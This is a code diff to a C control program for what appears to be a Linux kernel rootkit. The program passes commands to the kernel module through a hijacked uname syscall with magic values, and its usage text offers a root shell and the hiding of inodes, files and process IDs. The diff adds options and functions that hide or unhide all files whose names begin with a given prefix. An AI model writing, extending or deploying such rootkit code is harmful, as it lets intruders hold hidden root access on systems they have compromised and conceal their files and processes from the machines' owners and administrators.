@@ -24,21 +24,25 @@ static struct option long_options[] = {
 	{"unhide-file", 1, 0, 4},
 	{"hide-pid", 1, 0, 5},
 	{"unhide-pid", 1, 0, 6},
-	{"debug-rk", 0, 0, 7},
-	{"debug-stats", 0, 0, 8},
+	{"hide-file-sw", 1, 0, 7},
+	{"unhide-file-sw", 1, 0, 8},
+	{"debug-rk", 0, 0, 9},
+	{"debug-stats", 0, 0, 10},
 	{0, 0, 0, 0}
 };
 
 void usage(const char *path)
 {
 	printf("%s [options]\n" \
-		"\t--hide-inode <inode>\thide inode\n"		\
-		"\t--unhide-inode <inode>\tunhide inode\n"	\
-		"\t--root-shell\t\tgive a root shell\n"		\
-		"\t--hide-file <path>\thide file\n"		\
-		"\t--unhide-file <path>\tunhide file\n"		\
-		"\t--debug-rk\t\t(for debugging purpose)\n"	\
-		"\t--debug-stats\t\t(for debugging purpose)\n"	\
+		"\t--hide-inode <inode>\thide inode\n"			\
+		"\t--unhide-inode <inode>\tunhide inode\n"		\
+		"\t--root-shell\t\tgive a root shell\n"			\
+		"\t--hide-file <path>\thide file\n"			\
+		"\t--unhide-file <path>\tunhide file\n"			\
+		"\t--hide-file-sw <name>\thide file starting with <name>\n"\
+		"\t--unhide-file-sw <name>\tunhide file starting with <name>\n"\
+		"\t--debug-rk\t\t(for debugging purpose)\n"		\
+		"\t--debug-stats\t\t(for debugging purpose)\n"		\
 		, path);
 }
 
@@ -132,6 +136,28 @@ void unhide_pid(pid_t pid)
 	unhide_file(proc_path);
 }
 
+void hide_file_starting_with(const char *name)
+{
+	struct rk_args args;
+
+	set_magics(&args);
+	args.mode = HIDE_FILE;
+	args.p_param1 = (void *)name;
+	args.param2 = strlen(name);
+	syscall(SYS_uname, &args);
+}
+
+void unhide_file_starting_with(const char *name)
+{
+	struct rk_args args;
+
+	set_magics(&args);
+	args.mode = UNHIDE_FILE;
+	args.p_param1 = (void *)name;
+	args.param2 = strlen(name);
+	syscall(SYS_uname, &args);
+}
+
 int main(int argc, char **argv)
 {
 	int c, opt_idx;
@@ -174,10 +200,16 @@ int main(int argc, char **argv)
 			unhide_pid(atoi(optarg));
 			break;
 		case 7:
+			hide_file_starting_with(optarg);
+			break;
+		case 8:
+			unhide_file_starting_with(optarg);
+			break;
+		case 9:
 			args.mode = DEBUG_RK;
 			syscall(SYS_uname, &args);
 			break;
-		case 8:
+		case 10:
 			args.mode = DEBUG_STATS;
 			syscall(SYS_uname, &args);
 			break;
